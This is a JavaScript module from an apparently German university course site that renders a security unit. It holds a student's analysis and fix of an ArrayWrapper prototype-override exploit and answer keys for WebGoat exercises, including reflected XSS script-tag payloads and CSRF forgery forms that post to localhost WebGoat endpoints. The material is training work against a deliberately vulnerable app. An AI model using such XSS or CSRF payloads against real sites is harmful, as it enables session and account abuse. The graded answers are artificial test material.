import {baseUrl} from "../util/url.js";
import {fetchCode} from "../util/code.js";
import {renderTaskPage} from "../ui/TaskPage/TaskPage.js";
import {renderWireframe} from "../ui/Wireframe/Wireframe.js";
import {modalIdGenerator} from "../util/generator.js";
import {defaultCodeClasses, defaultWireframeClasses} from "../util/classes.js";
import {renderCode} from "../ui/General/General.js";

const modalIds = modalIdGenerator();

export const tocThirteen = {
    content: [
        {
            title: "Sicherer ArrayWrapper",
            descriptions: [
                "ArrayWrapper Exploit",
                "Security Concept"
            ]
        },
        {
            title: "WebGoat XSS",
            descriptions: [
                "Docker Image with WebGoat",
                "WebGoat Tasks",
                "Cross Site Scripting",
            ]
        },
        {
            title: "WebGoat Cross-Site Request Forgeries",
            descriptions: [
                "Docker Image with WebGoat",
                "WebGoat Tasks",
                "Cross-Site Request Forgeries",
            ]
        },
    ],
}

export const exerciseThirteen = {
    title: "Lerneinheit 13: Sicherheit",
    tasks: [
        {
            title: "13.1. Sicherer ArrayWrapper (2 Punkte)",
            text: [
                {
                    request: "In der Vorlesung wurde ein ArrayWrapper Exploit gezeigt.\n" +
                        "<br>" +
                        "Analysieren Sie die Ursache dieses Exploits.\n" +
                        "<br>" +
                        "Entwickeln Sie ein Sicherheitskonzept und eine ArrayWrapper-Lösung, die gegen diesen Exploit gewappnet ist." +
                        "<br>" +
                        "Geben Sie hier Ihr Ursachenanalyse ein:",
                    reply: "In JavaScript kann man auf die Values eines Objektes mt zwei Schreibweisen zugreifen. Einmal mit dem Punkt, also z.B. foo.bar oder mit eckigen Klammern, also foo['bar']. Letzteres ist hilfreich für Keys mit Sonderzeichen im Namen. Z.B. foo['foo-bar'] funktioniert, während foo.foo-bar nicht funktioniert. \n" +
                        "Der Exploit ruft nun 'set' auf dem ArrayWrapper Objekt auf, aber anstatt einen Index anzugeben für den 'pos' Parameter, gibt er 'push' zusammen mit einer Funktion, die auf 'this' zugreift. Die standardmäßige Funktion 'push' von Arrays wurde nun überschrieben. Da im 'append' des Arraywrappers nun 'push' auf dem privaten Array selbst aufgerufen wird, wird die überschriebene Funktion ausgeführt und das this nimmt den Wert vom privaten Array an. Somit konnte sich der Exploit Zugriff auf das private Array beschaffen. ",
                },
                {
                    request: "Geben Sie hier Ihr Sicherheitskonzept ein:",
                    reply: "Die Überprüfung auf einen Zahlenwert bei der 'set' Funktion des ArrayWrappers würde es Benutzern nur erlauben, Zahlen einzugeben. So werden beim 'set' des ArrayWrappers auch wirklich nur Werte des inneren Arrays an der jeweligen Stelle zurückgeben und das Überschreiben von den Objektwerten wird verhindert."
                },
                {
                    request: "Geben Sie hier Ihren JS-Code eines sicheren ArrayWrappers ein:",
                    reply: renderCode(await fetchCode("../wireframes/u13-t1.js"), defaultCodeClasses),
                }
            ]
        },
        {
            title: "13.3. WebGoat XSS (3 Punkte)",
            text: [
                {
                    request: "Installieren Sie WebGoat.\n" +
                        "<br>" +
                        "Starten Sie das Docker Image mit WebGoat.\n" +
                        "<br>" +
                        "Öffnen Sie die Landing Page von WebGoat.\n" +
                        "<br>" +
                        "Lösen Sie die Aufgaben zu (A8:2013) Request Forgeries, Cross-Site Request Forgeries.",
                    reply: "1.) yes\n" +
                        "<br>" +
                        "2.) credit card field with '&ltscript&gtalert()&lt/script&gt'\n" +
                        "<br>" +
                        "3.) start.mvc#test/\n" +
                        "<br>" +
                        "4.1) /start.mvc#test/&ltscript&gtwebgoat.customjs.phoneHome()&lt%2Fscript&gt\n" +
                        "4.2) -251991021\n" +
                        "<br>" +
                        "5.1) solution 4\n" +
                        "5.2) solution 3\n" +
                        "5.3) solution 1\n" +
                        "5.4) solution 2\n" +
                        "5.5) solution 4"
                }
            ]
        },
        {
            title: "13.4. WebGoat Cross-Site Request Forgeries (3 Punkte)",
            text: [
                {
                    request: "Installieren Sie WebGoat.\n" +
                        "<br>" +
                        "Starten Sie das Docker Image mit WebGoat.\n" +
                        "<br>" +
                        "Öffnen Sie die Landing Page von WebGoat.\n" +
                        "<br>" +
                        "Lösen Sie die Aufgaben zu (A8:2013) Request Forgeries, Cross-Site Request Forgeries.",
                    reply: renderCode("1.1)\n" +
                        "&ltform method='POST' action='http://localhost:8080/WebGoat/csrf/basig-get-flag'&gt\n" +
                        "&ltinput name'csrf' type='hidden' value='false'&gt\n" +
                        "&ltinput type='submit' name='submit'&gt\n" +
                        "&lt/form&gt\n" +
                        "1.2) Flag: 33335\n" +
                        "\n" +
                        "2.)\n" +
                        "&ltform method='POST' action='http://localhost:8080/WebGoat/csrf/review'&gt\n" +
                        "&ltinput type='text' name'reviewText'&gt\n" +
                        "&ltinput type='text' name'stars'&gt\n" +
                        "&ltinput type='text' name'validateReq' value='2aa14227b9a13d0bede0388a7fba9aa9'&gt\n" +
                        "&ltinput type='submit' value='Submit a review'&gt\n" +
                        "&lt/form&gt\n" +
                        "\n" +
                        "3.)\n" +
                        "&ltform method='POST' action='http://localhost:8080/WebGoat/csrf/feedback/message' contenttype='text/plain'&gt\n" +
                        "&ltinput type='hidden' name='{\n" +
                        "\"name\": \"Webgoat\",\n" +
                        "\"email\": \"webgoat@webgoat.orf\",\n" +
                        "\"content\": \"WebGoat is the best!!\",\n" +
                        "\"subject\": \"Suggestions\",\n" +
                        "\"message\": \"hello\"\n" +
                        "}'&gt\n" +
                        "&ltinput type='submit' value='Submit'&gt\n" +
                        "&lt/form&gt\n" +
                        "\n" +
                        "4.)\n" +
                        "&ltform method='POST' action='http://localhost:8080/WebGoat/login'&gt\n" +
                        "&ltinput type='text' name'username'&gt\n" +
                        "&ltinput type='password' name'password'&gt\n" +
                        "&ltbutton type='submit'&gtSign in&lt/button&gt\n" +
                        "&lt/form&gt", defaultCodeClasses)
                }
            ]
        },
    ]
}